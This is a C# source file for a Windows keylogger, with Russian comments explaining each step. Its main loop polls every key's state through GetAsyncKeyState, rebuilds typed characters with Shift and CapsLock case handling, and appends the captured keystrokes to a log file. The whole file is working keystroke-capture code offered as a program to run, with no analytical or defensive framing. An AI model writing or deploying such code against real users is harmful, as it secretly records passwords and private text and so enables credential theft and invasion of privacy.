using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace keylogger
{
    static class Program
    {
        const int MaxBufferSize = 10; // Максимальный размер буфера для накопления нажатий клавиш

        static void Main()
        {
            var buf = string.Empty; // Инициализация строки для накопления нажатых клавиш

            while (true)
            {
                Thread.Sleep(100); // Приостановка выполнения программы на 100 миллисекунд

                for (int i = 0; i < 255; i++)
                {
                    int state = WinApiWrapper.GetAsyncKeyState(i); // Получение состояния клавиши

                    if (state != (int)KeyState.Unpressed)
                    {
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; } // Добавление пробела
                        if (((Keys)i) == Keys.Enter) { buf += Environment.NewLine; continue; } // Добавление новой строки
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue; // Пропуск кнопок мыши

                        if (((Keys)i).ToString().Length == 1)
                        {
                            // Добавление символа в буфер (в верхнем или нижнем регистре в зависимости от состояния Shift и CapsLock)
                            buf += IsBigSymbol() ? ((Keys)i).ToString().ToUpper() : ((Keys)i).ToString().ToLower();
                        }

                        if (buf.Length > MaxBufferSize)
                        {
                            File.AppendAllText("keylogger.log", buf); // Запись содержимого буфера в файл
                            buf = ""; // Очистка буфера
                        }
                    }
                }
            }
        }

        static bool IsBigSymbol()
        {
            bool shift = false;

            var shiftNumber = 16; // Код клавиши Shift
            short shiftState = (short)WinApiWrapper.GetAsyncKeyState(shiftNumber); // Получение состояния клавиши Shift

            if ((shiftState & 0x8000) == 0x8000)
            {
                shift = true; // Если клавиша Shift нажата, устанавливаем флаг
            }

            var caps = Console.CapsLock; // Получение состояния клавиши CapsLock
            bool isBig = shift | caps; // Определение, нужен ли символ в верхнем регистре

            return isBig; // Возвращаем результат
        }
    }

    public enum KeyState : int
    {
        Unpressed = 0 // Состояние "некликнутой" клавиши
    }
}
